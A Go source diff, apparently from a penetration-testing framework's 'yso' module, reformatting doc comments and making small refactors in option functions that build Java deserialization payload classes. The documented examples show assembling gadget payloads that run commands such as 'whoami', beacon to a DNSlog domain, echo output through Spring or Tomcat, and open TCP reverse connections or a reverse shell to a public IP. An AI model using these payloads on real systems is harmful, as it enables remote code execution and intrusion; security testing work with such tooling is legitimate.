@@ -22,8 +22,13 @@ func GenerateClassWithType(typ ClassType, options ...GenClassOptionFun) (*javacl
 // GenerateClass 根据提供的配置选项生成一个Java类对象。
 // 这个函数是生成各种类型Java类对象的核心函数，它可以处理原始字节码类型和预定义的类模板。
 // 对于原始字节码类型(ClassRaw)，它直接解析提供的模板；对于其他类型，它从YsoConfigInstance中加载相应的类模板并应用参数。
-// options：一组GenClassOptionFun函数，用于配置生成的类对象的各种属性。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 一组 GenClassOptionFun 函数，用于配置生成的类对象的各种属性
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // // 使用原始字节码生成类对象
@@ -113,7 +118,12 @@ func NewClassConfig(options ...GenClassOptionFun) *ClassGenConfig {
 }
 
 // SetClassType 设置要生成的类类型
-// t: 类类型
+// 参数:
+//   - t: 类类型
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // classObj,_ = yso.GenerateClass(yso.useTemplate("RuntimeExec"))
@@ -125,7 +135,9 @@ func SetClassType(t ClassType) GenClassOptionFun {
 }
 
 // SetCustomTemplate 设置自定义的类模板字节码
-// customBytes: 自定义模板的字节码
+// 参数:
+//   - customBytes: 自定义模板的字节码
+//
 // Example:
 // ```
 // classObj,_ = yso.GenerateClass(yso.SetCustomTemplate(templateBytes))
@@ -147,8 +159,15 @@ func (cf *ClassGenConfig) GetParam(name ClassParamType) (string, bool) {
 type GenClassOptionFun func(config *ClassGenConfig)
 
 // SetClassParam 设置类生成时的参数
-// k: 参数名
-// v: 参数值
+// 参数:
+//   - k: 参数名
+//
+// 参数:
+//   - v: 参数值
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // classObj,_ = yso.GenerateClass(yso.useClassParam("command","whoami"))
@@ -161,7 +180,12 @@ func SetClassParam(k, v string) GenClassOptionFun {
 
 // SetClassName
 // evilClassName 请求参数选项函数，用于设置生成的类名。
-// className：要设置的类名。
+// 参数:
+//   - className: 要设置的类名
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
@@ -174,31 +198,46 @@ func SetClassName(className string) GenClassOptionFun {
 
 // SetConstruct
 // useConstructorExecutor 请求参数选项函数，用于设置是否使用构造器执行。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.useConstructorExecutor())
 // ```
 func SetConstruct() GenClassOptionFun {
+	v := true
 	return func(config *ClassGenConfig) {
-		config.IsConstruct = true
+		config.IsConstruct = v
 	}
 }
 
 // SetObfuscation
 // obfuscationClassConstantPool 请求参数选项函数，用于设置是否混淆类常量池。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.obfuscationClassConstantPool())
 // ```
 func SetObfuscation() GenClassOptionFun {
+	v := true
 	return func(config *ClassGenConfig) {
-		config.IsObfuscation = true
+		config.IsObfuscation = v
 	}
 }
 
 // SetBytesEvilClass
 // useBytesEvilClass 请求参数选项函数，传入自定义的字节码。
-// data：自定义的字节码。
+// 参数:
+//   - data: 自定义的字节码
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // bytesCode,_ =codec.DecodeBase64(bytes)
@@ -226,7 +265,12 @@ func SetClassBase64Bytes(base64 string) GenClassOptionFun {
 
 // SetClassBytes
 // useBytesClass 请求参数选项函数，传入字节码。
-// data：字节码。
+// 参数:
+//   - data: 字节码
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // bytesCode,_ =codec.DecodeBase64(bytes)
@@ -242,9 +286,16 @@ func SetClassBytes(data []byte) GenClassOptionFun {
 // LoadClassFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。
 // 这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。
 // 这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。
-// bytes：要从中加载类对象的字节数组。
-// options：用于配置类对象的可变参数函数列表。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - bytes: 要从中加载类对象的字节数组
+//
+// 参数:
+//   - options: 用于配置类对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // bytesCode,_ =codec.DecodeBase64("yv66vg...")
@@ -258,8 +309,13 @@ func LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassp
 // 这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。
 // 这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。
 // base64：要从中加载类对象的base64编码字符串。
-// options：用于配置类对象的可变参数函数列表。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 用于配置类对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // classObject, _ := yso.LoadClassFromBytes("yv66vg...") // 从字节中加载并配置类对象
@@ -277,9 +333,16 @@ func LoadClassFromBase64(base64 string, options ...GenClassOptionFun) (*javaclas
 // 并从这些字节中加载并返回一个javaclassparser.ClassObject对象。
 // 这个函数首先使用javaclassparser.Bcel2bytes转换BCEL格式的数据，然后利用GenerateClassObjectFromBytes生成类对象。
 // 可通过可变参数`options`来定制类对象的特定属性或行为。
-// data：BCEL格式的Java类数据。
-// options：用于配置类对象的可变参数函数列表。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - data: BCEL 格式的 Java 类数据
+//
+// 参数:
+//   - options: 用于配置类对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // bcelData := "$$BECL$$..." // 假设的BCEL数据
@@ -306,9 +369,16 @@ func LoadClassFromJson(jsonData string, options ...GenClassOptionFun) (*javaclas
 // GenerateClassObjectFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。
 // LoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。
 // 参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。
-// bytes：要从中加载类对象的字节数组。
-// options：用于配置类对象的可变参数函数列表。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - bytes: 要从中加载类对象的字节数组
+//
+// 参数:
+//   - options: 用于配置类对象的可变参数函数列表
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // bytesCode,_ =codec.DecodeBase64("yv66vg...")
@@ -320,6 +390,12 @@ func GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*
 
 // SetExecCommand
 // command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。
+// 参数:
+//   - cmd: 要执行的命令字符串
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
@@ -330,6 +406,18 @@ func SetExecCommand(cmd string) GenClassOptionFun {
 	}
 }
 
+// SetMajorVersion
+// majorVersion 请求参数选项函数，用于设置生成的 Java 类文件的 major 版本号(取值范围 45-62，超出范围回退为 52)。
+// 参数:
+//   - v: Java 类文件的 major 版本号，取值范围 45-62
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
+// Example:
+// ```
+// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"),yso.majorVersion(52))
+// ```
 func SetMajorVersion(v uint16) GenClassOptionFun {
 	// 定义Java类文件格式的最小和最大major版本号 1.1 18
 	const minMajorVersion uint16 = 45 //
@@ -345,19 +433,26 @@ func SetMajorVersion(v uint16) GenClassOptionFun {
 
 // SetClassRuntimeExecTemplate
 // useRuntimeExecTemplate 请求参数选项函数，用于设置生成RuntimeExec类的模板，需要配合 command 使用。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.command("whoami"))
 // ```
 func SetClassRuntimeExecTemplate() GenClassOptionFun {
+	t := ClassRuntimeExec
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassRuntimeExec
+		config.ClassType = t
 	}
 }
 
 // SetRuntimeExecEvilClass
 // useRuntimeExecEvilClass 请求参数选项函数，设置生成RuntimeExec类的模板，同时设置要执行的命令。
-// cmd：要执行的命令字符串。
+// 参数:
+//   - cmd: 要执行的命令字符串
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
@@ -372,9 +467,16 @@ func SetRuntimeExecEvilClass(cmd string) GenClassOptionFun {
 // GenerateRuntimeExecEvilClassObject 生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象，
 // 并设置一个指定的命令来执行。这个函数结合使用SetClassRuntimeExecTemplate和SetExecCommand函数，
 // 以生成在反序列化时会执行特定命令的Java对象。
-// cmd：要在生成的Java对象中执行的命令字符串。
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要在生成的Java对象中执行的命令字符串
+//
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -386,19 +488,26 @@ func GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun
 
 // SetClassProcessBuilderExecTemplate
 // useProcessBuilderExecTemplate 请求参数选项函数，用于设置生成ProcessBuilderExec类的模板，需要配合 command 使用。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecTemplate(),yso.command("whoami"))
 // ```
 func SetClassProcessBuilderExecTemplate() GenClassOptionFun {
+	ct := ClassProcessBuilderExec
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassProcessBuilderExec
+		config.ClassType = ct
 	}
 }
 
 // SetProcessBuilderExecEvilClass
 // useProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。
-// cmd：要执行的命令字符串。
+// 参数:
+//   - cmd: 要执行的命令字符串
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
@@ -413,9 +522,16 @@ func SetProcessBuilderExecEvilClass(cmd string) GenClassOptionFun {
 // GenerateProcessBuilderExecEvilClassObject 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象，
 // 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExecTemplate和SetExecCommand函数，
 // 以生成在反序列化时会执行特定命令的Java对象。
-// cmd：要在生成的Java对象中执行的命令字符串。
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要在生成的Java对象中执行的命令字符串
+//
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -427,19 +543,26 @@ func GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOp
 
 // SetClassProcessImplExecTemplate
 // useProcessImplExecTemplate 请求参数选项函数，用于设置生成ProcessImplExec类的模板，需要配合command使用。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecTemplate(),yso.command("whoami"))
 // ```
 func SetClassProcessImplExecTemplate() GenClassOptionFun {
+	ct := ClassProcessImplExec
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassProcessImplExec
+		config.ClassType = ct
 	}
 }
 
 // SetProcessImplExecEvilClass
 // useProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。
-// cmd：要执行的命令字符串。
+// 参数:
+//   - cmd: 要执行的命令字符串
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
@@ -454,9 +577,16 @@ func SetProcessImplExecEvilClass(cmd string) GenClassOptionFun {
 // GenerateProcessImplExecEvilClassObject 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象，
 // 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和SetExecCommand函数，
 // 以生成在反序列化时会执行特定命令的Java对象。
-// cmd：要在生成的Java对象中执行的命令字符串。
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - cmd: 要在生成的Java对象中执行的命令字符串
+//
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // command := "ls" // 假设的命令字符串
@@ -468,19 +598,26 @@ func GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptio
 
 // SetClassDnslogTemplate
 // useDnslogTemplate 请求参数选项函数，用于设置生成Dnslog类的模板，需要配合 dnslogDomain 使用。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
 // ```
 func SetClassDnslogTemplate() GenClassOptionFun {
+	ct := ClassDNSLog
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassDNSLog
+		config.ClassType = ct
 	}
 }
 
 // SetDnslog
 // dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。
-// addr：要设置的 Dnslog 域名。
+// 参数:
+//   - addr: 要设置的 Dnslog 域名
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
@@ -493,7 +630,9 @@ func SetDnslog(addr string) GenClassOptionFun {
 
 // SetDnslogEvilClass
 // useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。
-// addr：要设置的 Dnslog 域名。
+// 参数:
+//   - addr: 要设置的 Dnslog 域名
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
@@ -509,9 +648,16 @@ func SetDnslogEvilClass(addr string) GenClassOptionFun {
 // GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，
 // 并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dnslogDomain 函数，
 // 以生成在反序列化时会向指定的 Dnslog 域名发送请求的Java对象。
-// domain：要在生成的Java对象中请求的 Dnslog 域名。
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - domain: 要在生成的Java对象中请求的 Dnslog 域名
+//
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // domain := "dnslog.com" // 假设的 Dnslog 域名
@@ -523,21 +669,33 @@ func GenDnslogClassObject(domain string, options ...GenClassOptionFun) (*javacla
 
 // SetClassSpringEchoTemplate
 // useSpringEchoTemplate 请求参数选项函数，用于设置生成SpringEcho类的模板，需要配合 springHeader 或 springParam 使用。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
 // ```
 func SetClassSpringEchoTemplate() GenClassOptionFun {
+	ct := ClassSpringEcho
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassSpringEcho
+		config.ClassType = ct
 	}
 }
 
 // SetHeader
 // springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。
 // 需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。
-// key：要设置的 header 键。
-// val：要设置的 header 值。
+// 参数:
+//   - key: 要设置的 header 键
+//
+// 参数:
+//   - val: 要设置的 header 值
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
@@ -551,7 +709,12 @@ func SetHeader(key string, val string) GenClassOptionFun {
 
 // SetParam
 // springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。
-// param：要设置的请求参数。
+// 参数:
+//   - val: 要设置的回显值/请求参数
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
@@ -564,32 +727,47 @@ func SetParam(val string) GenClassOptionFun {
 
 // SetExecAction
 // springRuntimeExecAction 请求参数选项函数，设置是否要执行命令。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
 // ```
 func SetExecAction() GenClassOptionFun {
+	v := "exec"
 	return func(config *ClassGenConfig) {
-		config.SetParam(ClassParamAction, "exec")
+		config.SetParam(ClassParamAction, v)
 	}
 }
 
 // SetEchoBody
 // springEchoBody 请求参数选项函数，设置是否要在body中回显。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
 // ```
 func SetEchoBody() GenClassOptionFun {
+	v := "body"
 	return func(config *ClassGenConfig) {
-		config.SetParam(ClassParamPosition, "body")
+		config.SetParam(ClassParamPosition, v)
 	}
 }
 
 // GenerateSpringEchoEvilClassObject 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象，
 // 这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容的Java对象。
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // 生成并配置SpringEcho Java对象
@@ -600,21 +778,31 @@ func GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclass
 
 // SetClassModifyTomcatMaxHeaderSizeTemplate
 // useModifyTomcatMaxHeaderSizeTemplate 请求参数选项函数，用于设置生成ModifyTomcatMaxHeaderSize类的模板。
+//
+// 返回值:
+//   - 用于配置 Java 对象生成的选项函数
+//
 // 一般用于shiro利用，用于修改 tomcat 的 MaxHeaderSize 值。
 // Example:
 // ```
 // yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useModifyTomcatMaxHeaderSizeTemplate())
 // ```
 func SetClassModifyTomcatMaxHeaderSizeTemplate() GenClassOptionFun {
+	ct := ClassModifyTomcatMaxHeaderSize
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassModifyTomcatMaxHeaderSize
+		config.ClassType = ct
 	}
 }
 
 // GenerateModifyTomcatMaxHeaderSizeEvilClassObject 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象，
 // 这个函数结合使用 useModifyTomcatMaxHeaderSizeTemplate 函数， 以生成在反序列化时会修改 tomcat 的 MaxHeaderSize 值的Java对象。
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // classObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject() // 生成并配置ModifyTomcatMaxHeaderSize Java对象
@@ -640,15 +828,18 @@ func GenEmptyClassInTemplateClassObject(options ...GenClassOptionFun) (*javaclas
 // yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
 // ```
 func SetClassTcpReverseTemplate() GenClassOptionFun {
+	ct := ClassTcpReverse
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassTcpReverse
+		config.ClassType = ct
 	}
 }
 
 // SetTcpReverseHost
 // tcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。
 // 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
-// host：要设置的 tcpReverseHost 的host。
+// 参数:
+//   - host: 要设置的 tcpReverseHost 的 host
+//
 // Example:
 // ```
 // host = "公网IP"
@@ -664,7 +855,9 @@ func SetTcpReverseHost(host string) GenClassOptionFun {
 // SetTcpReversePort
 // tcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。
 // 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
-// port：要设置的 tcpReversePort 的port。
+// 参数:
+//   - port: 要设置的 tcpReversePort 的 port
+//
 // Example:
 // ```
 // host = "公网IP"
@@ -679,7 +872,9 @@ func SetTcpReversePort(port int) GenClassOptionFun {
 
 // SetTcpReverseToken
 // tcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。
-// token：要设置的 token 。
+// 参数:
+//   - token: 要设置的 token
+//
 // Example:
 // ```
 // host = "公网IP"
@@ -695,8 +890,12 @@ func SetTcpReverseToken(token string) GenClassOptionFun {
 // SetTcpReverseEvilClass
 // useTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。
 // 相当于 useTcpReverseTemplate ，tcpReverseHost  两个个函数的组合。
-// host：要设置的 tcpReverseHost 的host。
-// port：要设置的 tcpReversePort 的port。
+// 参数:
+//   - host: 要设置的 tcpReverseHost 的 host
+//
+// 参数:
+//   - port: 要设置的 tcpReversePort 的 port
+//
 // Example:
 // ```
 // host = "公网IP"
@@ -714,10 +913,19 @@ func SetTcpReverseEvilClass(host string, port int) GenClassOptionFun {
 // GenTcpReverseClassObject
 // GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，
 // 这个函数结合使用 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 函数， 以生成在反序列化时会反连指定的 tcpReverseHost ，tcpReversePort 的Java对象。
-// host：要设置的 tcpReverseHost 的host。
-// port：要设置的 tcpReversePort 的port。
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - host: 要设置的 tcpReverseHost 的 host
+//
+// 参数:
+//   - port: 要设置的 tcpReversePort 的 port
+//
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // host = "公网IP"
@@ -737,16 +945,21 @@ func GenTcpReverseClassObject(host string, port int, options ...GenClassOptionFu
 // yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellTemplate(),yso.tcpReverseShellHost(host),yso.tcpReverseShellPort(8080))
 // ```
 func SetClassTcpReverseShellTemplate() GenClassOptionFun {
+	ct := ClassTcpReverseShell
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassTcpReverseShell
+		config.ClassType = ct
 	}
 }
 
 // SetTcpReverseShellEvilClass
 // useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。
 // 相当于 useTcpReverseShellTemplate ，tcpReverseShellHost，tcpReverseShellPort  三个个函数的组合。
-// host：要设置的 tcpReverseShellHost 的host。
-// port：要设置的 tcpReverseShellPort 的port。
+// 参数:
+//   - host: 要设置的 tcpReverseShellHost 的 host
+//
+// 参数:
+//   - port: 要设置的 tcpReverseShellPort 的 port
+//
 // Example:
 // ```
 // host = "公网IP"
@@ -763,10 +976,19 @@ func SetTcpReverseShellEvilClass(host string, port int) GenClassOptionFun {
 // GenTcpReverseShellClassObject
 // GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，
 // 这个函数结合使用 useTcpReverseShellTemplate ，tcpReverseShellHost ，tcpReverseShellPort 函数， 以生成在反序列化时会反连指定的 tcpReverseShellHost ，tcpReverseShellPort 的Java对象。
-// host：要设置的 tcpReverseShellHost 的host。
-// port：要设置的 tcpReverseShellPort 的port。
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - host: 要设置的 tcpReverseShellHost 的 host
+//
+// 参数:
+//   - port: 要设置的 tcpReverseShellPort 的 port
+//
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // host = "公网IP"
@@ -786,8 +1008,9 @@ func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOpt
 // headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetClassTomcatEchoTemplate() GenClassOptionFun {
+	ct := ClassTomcatEcho
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassTomcatEcho
+		config.ClassType = ct
 	}
 }
 
@@ -802,15 +1025,21 @@ func SetClassTomcatEchoTemplate() GenClassOptionFun {
 // headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetTomcatEchoEvilClass() GenClassOptionFun {
+	ct := ClassTomcatEcho
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassTomcatEcho
+		config.ClassType = ct
 	}
 }
 
 // GenTomcatEchoClassObject
 // GenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象，
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // body 回显
@@ -832,8 +1061,9 @@ func GenTomcatEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.Cl
 // headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetClassMultiEchoTemplate() GenClassOptionFun {
+	ct := ClassMultiEcho
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassMultiEcho
+		config.ClassType = ct
 	}
 }
 
@@ -848,15 +1078,21 @@ func SetClassMultiEchoTemplate() GenClassOptionFun {
 // headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
